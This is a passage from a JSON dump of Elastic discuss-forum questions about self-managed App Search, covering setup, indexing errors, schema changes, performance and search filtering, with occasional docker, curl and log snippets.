    "body": "I tried to install self managed app search with my existing aws elasticsearch cluster. but i got problem on installation process. > $ docker run -ti \\ > -e elasticsearch.host=https://search-xxx.xxxx.ap-southeast-1.es.amazonaws.com \\ > -e secret_session_key=wkwk \\ > docker.elastic.co/app-search/app-search:7.3.0 i got error message {\"message\":\"Authorization header requires 'Credential' parameter. Authorization header requires 'Signature' parameter. Authorization header requires 'SignedHeaders' parameter. Authorization header requires existence of either a 'X-Amz-Date' or a 'Date' header. Authorization=Basic ZWxhc3RpYzpjaGFuZ2VtZQ==\"} i think this issue same as Prevent inclusion of Authorization header. App search send authorization header to aws while if authorization header present, aws need another header to process request. How to prevent app search include authorization header ?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "1d62381e-9cc5-4f3c-ad4d-2234f33ce1f9",
    "url": "https://discuss.elastic.co/t/where-app-search-data-stored/204320",
    "title": "Where app search data stored?",
    "category": [
      "App Search"
    ],
    "author": "Ardy_Febriansyah",
    "date": "October 19, 2019, 6:46pm October 21, 2019, 2:27pm October 21, 2019, 12:24pm November 18, 2019, 12:24pm",
    "body": "Where app search data stored ? and is safe run self managed app search on stateless deployment on kubernetes ?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1d9a62f1-7b6c-496f-a20a-6872281efdb2",
    "url": "https://discuss.elastic.co/t/unable-to-access-app-search-on-remote-server/204310",
    "title": "Unable to access app search on remote server",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "October 19, 2019, 12:36pm October 21, 2019, 8:42am October 21, 2019, 8:53am October 21, 2019, 9:01am November 18, 2019, 9:15am",
    "body": "I've successfully installed the app-search on Ubuntu 18.04 and tweaked the app-search.yml to include: app_search.external_url: http://my-domain.com/search-dashboard The page however is captured by the framework running on the front end; and not by app-search. I'm running out of ideas on how to make it work. Would really appreciate your help in fixing this issue.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "19661e7c-76de-435b-8a2e-30d5848f4ac8",
    "url": "https://discuss.elastic.co/t/delete-the-schema-fileds-from-app-search/203954",
    "title": "Delete the schema fileds from app-search",
    "category": [
      "App Search"
    ],
    "author": "teja_sri",
    "date": "October 17, 2019, 2:20am October 17, 2019, 9:15am November 14, 2019, 9:15am",
    "body": "Hi , I am a new user to app-search while I was playing with app-search I updated some documents and later I have decided to change the fields from the documents, but I have realized that the old fields still exist in the schema. Is there any way to delete the old fields from the schema?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6b902857-337d-49a6-ad18-b63498e61552",
    "url": "https://discuss.elastic.co/t/app-search-create-new-engine-problem/202855",
    "title": "App search: create new engine problem",
    "category": [
      "App Search"
    ],
    "author": "JyL",
    "date": "October 9, 2019, 2:43pm October 9, 2019, 2:46pm October 9, 2019, 2:49pm October 9, 2019, 2:50pm October 9, 2019, 2:52pm October 9, 2019, 3:37pm October 10, 2019, 12:50pm November 7, 2019, 12:50pm",
    "body": "Hey guys, need help with a create new engine problem on app search. There is no engine with the same name that I am willing to create. But I did have an engine with the same name previous, so now when I create new engine with this name, it shows an error \" Name cannot be reused: xxxxxxx\". Could anyone have any idea of that?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "bd7e674e-ba74-4046-a0d4-1fcb4d6cbe2c",
    "url": "https://discuss.elastic.co/t/combine-join-search-results/202373",
    "title": "Combine/join search results",
    "category": [
      "App Search"
    ],
    "author": "JyL",
    "date": "October 4, 2019, 6:37pm October 9, 2019, 3:38pm October 9, 2019, 6:50pm November 6, 2019, 6:51pm",
    "body": "Need help: want to find a way to join search results we get from multi_search api. I want to have multiple queries, each of them related with a different search field, want to join the result. Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "badeb8c5-f3fd-4385-9172-df34c81bfeee",
    "url": "https://discuss.elastic.co/t/deleting-app-search-engines/202848",
    "title": "Deleting app-search engines",
    "category": [
      "App Search"
    ],
    "author": "teja_sri",
    "date": "October 9, 2019, 2:30pm October 9, 2019, 2:44pm October 9, 2019, 2:47pm October 9, 2019, 2:53pm October 9, 2019, 3:37pm",
    "body": "Hey All, I am trying to delete an app-search engine and trying to create another engine with the same name as the deleted engine but I am getting the error as 'name cannot be reused'. Can anyone tell me why is this occurring and what is the solution.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6f50f2c7-20d3-47b6-abb6-45b48f4e6aaa",
    "url": "https://discuss.elastic.co/t/tips-to-increase-query-performance/202304",
    "title": "Tips to increase query performance",
    "category": [
      "App Search"
    ],
    "author": "jarnor",
    "date": "October 4, 2019, 8:35am October 4, 2019, 3:26pm October 7, 2019, 8:08am November 4, 2019, 8:08am",
    "body": "Hi! I'm wondering if you have any tips to increase the query performance of App Search. We've an index with ~10 million documents which have quite poor query performance. Simple queries can take between 4-5 seconds and paging between the documents in the App Search dashboard (/documents) takes >2 seconds. This can be compared to ~300 ms (for paging in the dashboard) for another index which only have ~300k documents, but identical schema/data. The query performance barley changed when moving from a 8 GB RAM to a 58 GB RAM cluster in Elastic Cloud. I'm quite green on elasticsearch in general, but noticed that the index .app-search-engine-xxxxxx (the one powering the queries I assume) only is divided between two shards? Could this be related to the poor performance? Is there any possibility to increase the shard count? Best, Johan",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "49b3fb24-09cc-4b33-bda3-c6ae705dfedc",
    "url": "https://discuss.elastic.co/t/appsearch-language-support-by-es-plugins/202389",
    "title": "Appsearch language support by ES plugins",
    "category": [
      "App Search"
    ],
    "author": "mrcallocu",
    "date": "October 4, 2019, 8:52pm October 4, 2019, 9:00pm October 4, 2019, 8:56pm November 1, 2019, 8:56pm",
    "body": "Hello, My language is not supported by default by appserach, however I would like to use one of the analysis plugins available for Elasticserach (https://www.elastic.co/guide/en/elasticsearch/plugins/current/analysis-stempel.html). How can I use it with appsearch? Is it possible to use custom analyzers, tokenizers, token filters for appsearch index in elasticsearch",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "0d98d7ac-1fed-40d1-b106-5b4218615589",
    "url": "https://discuss.elastic.co/t/searching-by-ranked-information/201422",
    "title": "Searching by Ranked information",
    "category": [
      "App Search"
    ],
    "author": "David_Williams1",
    "date": "September 27, 2019, 3:05pm October 2, 2019, 4:28pm October 2, 2019, 6:50pm October 4, 2019, 11:45am November 1, 2019, 11:45am",
    "body": "Elastic has the ability to do a ranked search but I cannot see that I can store the information in the document and then return the documents based on the rank. This an example of how I would store the information in a field (but I am open to anything) but I'm not sure if/how to query the engine to sort based on Topic A's rank. [{\"Topic A\":.5}, (\"Topic B\":.855}, {\"Topic C\":.255}, {\"Topic D\":.641}, {\"Topic E\":.500}, {\"Topic F\":.541}, {\"Topic G\":.523}] Has anyone done this or something similar? https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-rank-feature-query.html",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "9dc0d6ac-cdef-4064-9447-a6f5a6f818da",
    "url": "https://discuss.elastic.co/t/self-managed-app-search-docker-7-4-0-e-worker-threads-do-not-work/201941",
    "title": "Self-managed app search docker 7.4.0, -e worker.threads do not work",
    "category": [
      "App Search"
    ],
    "author": "axelhildingson",
    "date": "October 2, 2019, 11:08am October 2, 2019, 3:15pm October 30, 2019, 3:15pm",
    "body": "I am running the app search docker and trying to change the worker pool but it nothing happens when I set -e worker.threads=8. When I look at port 3003 is the worker count still 4. docker run -ti -p 3003:3003 -p 3002:3002 -e elasticsearch.host=<host> -e elasticsearch.password=<password> -e elasticsearch.username=<username> -e worker.threads=8 docker.elastic.co/app-search/app-search:7.4.0",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e4d398f8-e3e1-4be0-99c3-fc0c2851656d",
    "url": "https://discuss.elastic.co/t/is-there-any-way-to-implement-document-level-security-in-app-search/201154",
    "title": "Is there any way to implement document level security in app search?",
    "category": [
      "App Search"
    ],
    "author": "ranjeet.tiwari",
    "date": "September 26, 2019, 6:37am September 27, 2019, 12:33pm September 29, 2019, 5:27am September 30, 2019, 11:59am October 28, 2019, 11:59am",
    "body": "Hi Team, We need to implement security trimming on search result. Presently we are using App search and Search UI to show result. Can we implement document level security in app search ?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c057612e-05cc-4095-b6ef-72acb4a93aa5",
    "url": "https://discuss.elastic.co/t/reference-ui-how-to-modify-whats-displayed-react-newbie/199471",
    "title": "Reference UI - how to modify what's displayed (React newbie)",
    "category": [
      "App Search"
    ],
    "author": "Per_Burstrom",
    "date": "September 13, 2019, 6:24pm September 13, 2019, 7:14pm September 13, 2019, 8:11pm September 17, 2019, 9:26am September 17, 2019, 1:28pm September 17, 2019, 2:17pm September 17, 2019, 3:29pm September 18, 2019, 2:30am September 18, 2019, 12:49pm September 18, 2019, 1:16pm September 18, 2019, 3:20pm September 21, 2019, 3:29pm September 23, 2019, 2:12pm September 28, 2019, 5:50pm October 26, 2019, 5:50pm",
    "body": "Hi, I'm currently evaluating Elastic App Search. I have written a script that inserts that data, and then I generated and downloaded the Reference UI React code to query the data from my site. It works great, but I would like to get control over the output. For example one of the fields outputted in plain text is an image link I would like to use to actually show the image. I have spent the whole day trying to figure out how to modify the App.js code to be able to do that, but I have now given up. Thing is that I'm totally new to React as well. bodyContent={ } So I would like to insert an tag which retrieve the url from one of the fields in the data I got from Elastic Search App. Any ideas? Thanks! /Per",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "89cb3b7d-8f89-4433-af9f-303f4ae4cfac",
    "url": "https://discuss.elastic.co/t/document-size-limit/198289",
    "title": "Document size limit",
    "category": [
      "App Search"
    ],
    "author": "KBuev",
    "date": "September 5, 2019, 4:07pm September 5, 2019, 4:14pm September 27, 2019, 9:54am October 25, 2019, 9:54am",
    "body": "Hi, all. Is there any way to get around the 102400 bytes document size limit in self-managed App Search? We're trying to use App Search to build a search solution for an internal knowledge base and the default limit is just way too low.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b12b6cbd-9582-4eb0-a72b-910f88d71746",
    "url": "https://discuss.elastic.co/t/pass-additional-filters-with-search-text-from-search-ui-to-app-search/199647",
    "title": "Pass additional filters with search text from Search UI to App search",
    "category": [
      "App Search"
    ],
    "author": "ranjeet.tiwari",
    "date": "September 16, 2019, 11:26am September 16, 2019, 11:46am September 16, 2019, 12:11pm September 17, 2019, 11:56am September 17, 2019, 4:28pm September 18, 2019, 5:57am September 18, 2019, 12:52pm September 18, 2019, 1:00pm September 18, 2019, 1:11pm September 18, 2019, 2:35pm September 19, 2019, 11:56am September 26, 2019, 6:38am September 26, 2019, 6:39am October 24, 2019, 6:40am",
    "body": "Is there any way to pass additional filters with search text from search UI to app search? We have advance filter screen, there user can select the several filters and hit the submit button for search result.",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "58c5658c-bcc1-49b5-852a-77a06373de3e",
    "url": "https://discuss.elastic.co/t/deleting-all-documents-inside-an-engine/200634",
    "title": "Deleting all documents inside an engine",
    "category": [
      "App Search"
    ],
    "author": "rajithsam",
    "date": "September 23, 2019, 7:19am September 23, 2019, 3:35pm September 26, 2019, 5:55am September 26, 2019, 5:55am October 24, 2019, 5:55am",
    "body": "Is it possible to delete all the documents inside an engine at once?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d32a77e4-8dd8-4d29-b1bd-0184e21c106c",
    "url": "https://discuss.elastic.co/t/elastic-app-search-search-against-multiple-engines/200633",
    "title": "Elastic App Search - Search against multiple engines",
    "category": [
      "App Search"
    ],
    "author": "rajithsam",
    "date": "September 23, 2019, 7:18am September 26, 2019, 5:55am September 26, 2019, 5:55am October 24, 2019, 5:55am",
    "body": "Hi! We are having 3 engines inside app-search. We want to do a search against these 3 engines & show the results. How to achieve this?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f34a026b-9df2-4e59-b08b-f52c578ea77a",
    "url": "https://discuss.elastic.co/t/deploying-reference-ui-for-app-search/200729",
    "title": "Deploying reference UI for App Search",
    "category": [
      "App Search"
    ],
    "author": "mc1392",
    "date": "September 23, 2019, 4:51pm September 23, 2019, 4:57pm September 23, 2019, 7:20pm September 23, 2019, 7:39pm September 24, 2019, 2:26pm September 24, 2019, 1:18pm September 24, 2019, 2:27pm October 22, 2019, 2:27pm",
    "body": "Has anyone had success deploying the reference search UI for app search? I am a bit confused. Do I need to install Apache or can I just spin up a Ubuntu and deploy?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "20b5f157-9bf4-410e-bc0a-be11ddfb960c",
    "url": "https://discuss.elastic.co/t/unable-to-index-documents/200442",
    "title": "Unable to index documents",
    "category": [
      "App Search"
    ],
    "author": "mc1392",
    "date": "September 20, 2019, 2:28pm September 20, 2019, 2:28pm September 20, 2019, 2:44pm October 18, 2019, 2:44pm",
    "body": "I'm using Java to push data into Swiftype App Search. The logs have 200 has the response, but when I investigate the error message is: Here is the request body: [ { \"fileExtension\": \"jpg\", \"id\": 21 } ] Here is the response in the logs: [ { \"id\": \"21\", \"errors\": [ \"Fields can only contain lowercase letters, numbers, and underscores: fileExtension.\" ] } ] I decided to send less fields, to help minimize the potential culprits. Just sending 2 fields, id and fileExtension, that data is all text, not funny characters or anything. Why am I getting this error when I am indexing simple text? This code here, I create Maps of data to send to Swiftype: public static <T> List<Map<String, Object>> buildData(List<T> items) { List<Map<String, Object>> data = new ArrayList<Map<String, Object>>(); for (Iterator<T> it = items.iterator(); it.hasNext();) { HashMap<String, Object> fieldMap = new HashMap<String, Object>(); Object o = it.next(); Field[] f = o.getClass().getDeclaredFields(); for (int i = 0; i < f.length; i++) { f[i].setAccessible(true); String name = f[i].getName(); System.out.println(name); Object value = null; try { value = f[i].get(o); } catch (IllegalArgumentException | IllegalAccessException e) { e.printStackTrace(); } ieldMap.put(name, value); } data.add(fieldMap); } return data; } And this code here, is how I actually send the data to Swiftype: Client client = new Client(host, privateKey); try { client.indexDocuments(engineName, data); } catch (ClientException e) { e.printStackTrace(); }",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3eb28d0f-9ca1-42e3-86ad-65c2915db605",
    "url": "https://discuss.elastic.co/t/inbuilt-connectors-available-to-interact-or-push-data-in-app-search/200390",
    "title": "Inbuilt connectors available to interact or push data in app search",
    "category": [
      "App Search"
    ],
    "author": "ranjeet.tiwari",
    "date": "September 20, 2019, 9:36am September 20, 2019, 12:46pm October 18, 2019, 12:58pm",
    "body": "Is there any inbuilt connectors available to interact or push data in app search using .net/.net core. In documentation, python,php and nodejs are supported.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c86b2042-0dab-4008-a01a-00a631654545",
    "url": "https://discuss.elastic.co/t/indexation-of-many-documents-in-appsearch/200039",
    "title": "Indexation of many documents in Appsearch",
    "category": [
      "App Search"
    ],
    "author": "misnard",
    "date": "September 18, 2019, 2:53pm October 16, 2019, 2:51pm",
    "body": "Hello, I currently encounter problems when indexing documents in self hosted AppSearch, I have 30 million entries in my source and as the documentation indicates we can only insert documents in packets of 100, for each packet of 100 it takes me 3087ms via the api node.js Appsearch instead when I use elasticsearch directly without going through appsearch and I index documents it is much faster (I do bulk indexing by packet of 10 000). Do you have solutions to increase the speed of document indexing in appsearch? Thank you, misnard.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "098263c2-846b-4b5c-816c-45ec9d93aff3",
    "url": "https://discuss.elastic.co/t/elastic-seach-is-not-accessiblle-on-host-machine/199932",
    "title": "Elastic seach is not accessiblle on host machine",
    "category": [
      "App Search"
    ],
    "author": "",
    "date": "September 18, 2019, 7:27am October 16, 2019, 7:27am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5ea83cfc-67d6-419a-ba6e-3da71d5676b7",
    "url": "https://discuss.elastic.co/t/ingest-meta-data-with-attachment-in-app-search/199656",
    "title": "Ingest meta data with attachment in App search",
    "category": [
      "App Search"
    ],
    "author": "ranjeet.tiwari",
    "date": "September 16, 2019, 12:14pm September 16, 2019, 5:09pm September 18, 2019, 7:07am October 16, 2019, 7:07am",
    "body": "hi Team In the elastic, we usually ingest the attachment in elasticsearch using attachment plugin(https://www.elastic.co/guide/en/elasticsearch/plugins/master/ingest-attachment.html) so we don’t have to worry about the types of file we are trying to ingest. Typically, we need different types of library to read the content of different types of file(i.e work, excel,pdf,pptx). By using this plugin, we do not need any types of library to read the content. Can we use the same with app search?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c0b344a7-a84f-4eff-a4fe-e6c12f707d5c",
    "url": "https://discuss.elastic.co/t/apply-fuzzy-search-in-app-search/199648",
    "title": "Apply fuzzy search in app search",
    "category": [
      "App Search"
    ],
    "author": "ranjeet.tiwari",
    "date": "September 16, 2019, 11:28am September 16, 2019, 11:37am September 16, 2019, 11:39am September 16, 2019, 11:46am October 14, 2019, 11:46am",
    "body": "Is there any way to enable and disable fuzzy search in app search?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7bba145e-be7d-4925-b82a-fc8a36fd7608",
    "url": "https://discuss.elastic.co/t/nameerror-uninitialized-constant-swiftype-loops/198253",
    "title": "NameError: uninitialized constant Swiftype::Loops",
    "category": [
      "App Search"
    ],
    "author": "kikil592",
    "date": "September 5, 2019, 1:02pm September 6, 2019, 12:08pm September 9, 2019, 7:31am September 10, 2019, 1:11pm September 12, 2019, 6:18pm October 10, 2019, 6:18pm",
    "body": "Hi there, I'm trying to index some documents with Elastic App Search. It is well connected with ElasticSearch but get the error: worker.1 | [2019-09-05T12:48:48.076+00:00][12003][2318][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [4a7070b0d56d1860a4ebec1c2551ce74f165041c] Performing Work::Engine::IndexAdder from EsqueuesMe(index_adder) with arguments: \"5d70d5accd7b75b751cd89bc\", [\"5d70d5c2cd7b75b751cd89c0\", \"5d70d5c2cd7b75b751cd89c1\"] worker.1 | [2019-09-05T12:48:48.149+00:00][12003][2314][rails][WARN]: Failed to claim job 4a7070b0d56d1860a4ebec1c2551ce74f165041c, claim conflict occurred worker.1 | [2019-09-05T12:48:48.300+00:00][12003][2318][rails][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [4a7070b0d56d1860a4ebec1c2551ce74f165041c] Adding document 5d70d5c2cd7b75b751cd89c0 to index for engine 5d70d5accd7b75b751cd89bc worker.1 | [2019-09-05T12:48:48.398+00:00][12003][2318][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [4a7070b0d56d1860a4ebec1c2551ce74f165041c] Performed Work::Engine::IndexAdder from EsqueuesMe(index_adder) in 315.18ms worker.1 | [2019-09-05T12:48:48.401+00:00][12003][2318][rails][ERROR]: Retrying Work::Engine::IndexAdder in 300 seconds, due to a StandardError. The original exception was #<NameError: uninitialized constant Swiftype::Loops>. worker.1 | [2019-09-05T12:48:48.406+00:00][12003][2318][rails][INFO]: [ActiveJob] Enqueueing a job into the '.app-search-esqueues-me_queue_v1_index_adder' index. {\"job_type\"=>\"ActiveJob::QueueAdapters::EsqueuesMeAdapter::JobWrapper\", \"payload\"=>{\"args\"=>[{\"job_class\"=>\"Work::Engine::IndexAdder\", \"job_id\"=>\"4a7070b0d56d1860a4ebec1c2551ce74f165041c\", \"queue_name\"=>\"index_adder\", \"arguments\"=>[\"5d70d5accd7b75b751cd89bc\", [\"5d70d5c2cd7b75b751cd89c0\", \"5d70d5c2cd7b75b751cd89c1\"]], \"locale\"=>:en, \"executions\"=>2}]}, \"status\"=>\"pending\", \"created_at\"=>1567687728405, \"perform_at\"=>1567688028403, \"attempts\"=>0} worker.1 | [2019-09-05T12:48:48.425+00:00][12003][2318][rails][INFO]: [ActiveJob] Ignoring duplicate job class=Work::Engine::IndexAdder, id=4a7070b0d56d1860a4ebec1c2551ce74f165041c, args=[\"5d70d5accd7b75b751cd89bc\", [\"5d70d5c2cd7b75b751cd89c0\", \"5d70d5c2cd7b75b751cd89c1\"]] worker.1 | [2019-09-05T12:48:48.428+00:00][12003][2318][active_job][INFO]: [ActiveJob] [2019-09-05 12:48:48 UTC] enqueued Work::Engine::IndexAdder job (4a7070b0d56d1860a4ebec1c2551ce74f165041c) on index_adder worker.1 | [2019-09-05T12:48:48.440+00:00][12003][2318][active_job][INFO]: [ActiveJob] Enqueued Work::Engine::IndexAdder (Job ID: 4a7070b0d56d1860a4ebec1c2551ce74f165041c) to EsqueuesMe(index_adder) at 2019-09-05 12:53:48 UTC with arguments: \"5d70d5accd7b75b751cd89bc\", [\"5d70d5c2cd7b75b751cd89c0\", \"5d70d5c2cd7b75b751cd89c1\"] worker.1 | [2019-09-05T12:48:48.444+00:00][12003][2318][rails][INFO]: Deleting: {:index=>\".app-search-esqueues-me_queue_v1_index_adder\", :type=>nil, :id=>\"4a7070b0d56d1860a4ebec1c2551ce74f165041c\"} Relevant line is: [rails][ERROR]: Retrying Work::Engine::IndexAdder in 300 seconds, due to a StandardError. The original exception was #<NameError: uninitialized constant Swiftype::Loops>. I've tried the 3 methods (json write, json load, curl) but same result What happen? ElasticSearch: 7.3.1 ElasticApp Search: 7.3.1 Java8 Ubuntu",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "6759a66d-ea35-442d-ae7f-ebbcbfca4f76",
    "url": "https://discuss.elastic.co/t/question-multiple-fields-search-separate-searches-in-single-query/198730",
    "title": "Question: multiple fields search, separate searches in single query",
    "category": [
      "App Search"
    ],
    "author": "JyL",
    "date": "September 9, 2019, 3:33pm September 9, 2019, 4:14pm September 9, 2019, 5:46pm September 9, 2019, 6:00pm September 9, 2019, 6:19pm September 12, 2019, 6:18pm October 10, 2019, 6:18pm",
    "body": "Hey guys, I am pretty new to elastic app search. I am facing problem with how to do an advanced search in different field within a query. So for example, I have an object Ojb, and it has multiple fields that I want to do individual searches on. Ojb(field1, field2, field3, field4). I want to have searchFields has all of the 4 fields that I would like to search, and in the query string, I want to have for example \"f1query, f2query, f3query, f4query\", and each of the query in this string will do search in corresponding fields, e.g. f1query search in field1. Those f1query / f2query/... could be null if I don't want to search anything on that field. For example the query might look like \"f1query,,,f4query\" which means I only want to search on the 1st and 4th fields. Could you guys give me some suggestion on how to do this? I really appreciate your help!!",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "4c0ba0b8-8a01-46a4-9f7c-2d1b349bddba",
    "url": "https://discuss.elastic.co/t/elastic-app-search-using-elastic-search-index/196631",
    "title": "Elastic App Search using Elastic Search Index",
    "category": [
      "App Search"
    ],
    "author": "Srini12",
    "date": "August 24, 2019, 5:40pm August 24, 2019, 6:20pm August 29, 2019, 7:14pm August 29, 2019, 7:16pm September 9, 2019, 6:59pm October 7, 2019, 7:07pm",
    "body": "Hi Is there any way possible to map my current elastic search documents to App search instead of writing to App search documents ? Details: We have existing elastic search index with lots of documents in it. I would like to use this index to build Elastic App Search. Please advise. Thanks in Advance Srini.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "a8ef71fd-102d-4e78-93f6-2fa9a1bc1829",
    "url": "https://discuss.elastic.co/t/app-search-limitations/196601",
    "title": "App Search Limitations",
    "category": [
      "App Search"
    ],
    "author": "j-rewerts",
    "date": "August 23, 2019, 10:39pm September 9, 2019, 4:21pm October 7, 2019, 4:37pm",
    "body": "Hi there! I've been evaluating App Search for use in indexing >10 Million documents. I've got a fairly basic self-hosted ES cluster, along with self-hosted app search. I've written several hundred thousand documents using App Search's API, but it only shows ~12k on the dashboard. Is it possible to self-host App Search at this scale? What limitations are there on App Search?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "372654a2-2dc7-4787-90bd-eb9cf41832b5",
    "url": "https://discuss.elastic.co/t/issue-running-app-search/198075",
    "title": "Issue running App Search",
    "category": [
      "App Search"
    ],
    "author": "fcsfaria",
    "date": "September 4, 2019, 4:14pm September 9, 2019, 7:34am October 7, 2019, 7:34am",
    "body": "Hi, I can run App Search with success in port 80. However when configured another port in parameter \"app_search.listen_port\" I receive an connection error in browser. It does not look as a \"network/firewall\" issue because App server console show \"http get\" message. Should the redirect URL to \"/login\" to produce the problem ? app-server.1 | [2019-09-04T15:53:10.561+00:00][29448][2368][rails][INFO]: [b3a9c185-dd2c-446c-9357-97f40c82b160] Started GET \"/\" for yyy.yy.yyy.yyy at 2019-09-04 15:53:10 +0000 app-server.1 | [2019-09-04T15:53:10.584+00:00][29448][2368][action_controller][INFO]: [b3a9c185-dd2c-446c-9357-97f40c82b160] Processing by LocoTogo::HomeController#index as HTML app-server.1 | [2019-09-04T15:53:10.586+00:00][29448][2368][action_controller][INFO]: [b3a9c185-dd2c-446c-9357-97f40c82b160] Parameters: {\"host\"=>\"hostname\", \"protocol\"=>\"http\"} app-server.1 | [2019-09-04T15:53:10.643+00:00][29448][2368][action_controller][INFO]: [b3a9c185-dd2c-446c-9357-97f40c82b160] Redirected to http://hostname/login",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "90e232c3-5f06-4663-9106-15c589bd1709",
    "url": "https://discuss.elastic.co/t/support-for-openid-connect/197127",
    "title": "Support for OpenId Connect?",
    "category": [
      "App Search"
    ],
    "author": "Dave_Russell",
    "date": "August 28, 2019, 1:40pm August 28, 2019, 4:17pm August 29, 2019, 8:12am August 29, 2019, 5:30pm September 26, 2019, 5:30pm",
    "body": "ElasticSearch supports OpenId Connect as an authentication source. I believe this requires a GOLD licence, or a paid-for security plugin (Search Guard) ? If my ES instance is using OpenID Connect, can AppSearch use the same users ? Or does it require AppSearch specific logins to be created? There is a mention of SAML support, but no mention of Active Directory / OpenID etc, or if ES plugin-provided security would be supported.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "85eb1983-6d00-4dd4-a453-c172f7d1494a",
    "url": "https://discuss.elastic.co/t/openapi-swagger-api-docs/197071",
    "title": "OpenAPI / Swagger API Docs?",
    "category": [
      "App Search"
    ],
    "author": "Dave_Russell",
    "date": "August 28, 2019, 8:48am August 28, 2019, 12:43pm August 28, 2019, 1:35pm August 28, 2019, 1:54pm September 25, 2019, 1:48pm",
    "body": "I'd like to dig into AppSearch as a potential integration with our SaaS offering, but there is no \"back end\" documentation available? No clear list of available APIs No Open API / Swagger document. No public sourcecode repo Do you have plans to make the App Search API details available publically, so we can create / generate our own clients in our language of choice ?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "63fa33fb-bfee-4289-a41b-1609ab514249",
    "url": "https://discuss.elastic.co/t/facets-broken-in-national-parks-demo/197078",
    "title": "Facets broken in national parks demo?",
    "category": [
      "App Search"
    ],
    "author": "Dave_Russell",
    "date": "August 28, 2019, 9:46am August 28, 2019, 1:36pm September 25, 2019, 12:35pm",
    "body": "https://parks.swiftype.info/ I don't get any facets returned - just json documents with clickable headings.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c6ce8a03-7ddc-4576-941f-df183f6ab97b",
    "url": "https://discuss.elastic.co/t/query-string-filter-get-all-record-using-elastic-search-version-1-7/193107",
    "title": "Query_string filter get all record using elastic search version 1.7",
    "category": [
      "App Search"
    ],
    "author": "yasir_abbas",
    "date": "July 31, 2019, 11:36am August 20, 2019, 6:35pm September 17, 2019, 6:35pm",
    "body": "I m trying to find user by nationality using query_string but it query return other nationality records. Can anyone help me out how query_string is working. curl -X GET 'http:/127.0.0.1:9200/user_alias/_search?size=1000&pretty' -d '{\"query\":{\"filtered\":{\"query\":{\"query_string\":{\"query\":\"nationality:\"\"AF\"\"\"}}}},\"filter\":{\"and\":[{\"terms\":{\"room_id\":[\"591\"]}},{\"bool\":{\"must\":[{\"exists\":{\"field\":\"nationality\"}}]}},{\"bool\":{\"must\":[{\"exists\":{\"field\":\"user.id\"}}]}}]},\"size\":1000,\"fields\":[\"user.id\", \"nationality\"]}' For example Data returns : id : 1 nationality : FA id : 2 nationality : CA",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b1dd585d-bae4-45a8-9ee9-118d48b6e346",
    "url": "https://discuss.elastic.co/t/searching-filtering-by-enums-tags-categories/195500",
    "title": "Searching/filtering by enums/tags/categories?",
    "category": [
      "App Search"
    ],
    "author": "Andrew_Bennett",
    "date": "August 16, 2019, 1:31pm August 16, 2019, 2:22pm August 16, 2019, 4:35pm August 19, 2019, 9:01pm August 19, 2019, 9:04pm August 20, 2019, 6:21pm August 20, 2019, 6:33pm September 17, 2019, 6:33pm",
    "body": "Hi all. I've got a large set of food dishes. I'd like to tag each dish with things like 'vegetarian', 'vegan', 'gluten free', etc. and be able to search by these tags. I.e., if a user wants to search 'pasta' as their query but also filter by 'vegetarian and gluten free'. As there are an indefinite number of tags it isn't feasible to give each tag its own field. I'd much prefer to put them all in one 'tags' field, comma separated. However, app-search seems to only filter/boost by exact match. I would like instead to do something like \"If my tags field does not contain the term 'vegetarian', do not return this result.\" Any ideas here? Thank you",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "19dc3fdc-32af-444f-a9a7-b77d660f8dc7",
    "url": "https://discuss.elastic.co/t/failed-authentication-after-period-of-time/194101",
    "title": "Failed authentication after period of time",
    "category": [
      "App Search"
    ],
    "author": "ayan",
    "date": "August 6, 2019, 8:34pm August 6, 2019, 10:44pm August 7, 2019, 6:27pm August 8, 2019, 7:44am August 8, 2019, 3:59pm August 17, 2019, 1:03am September 14, 2019, 1:03am",
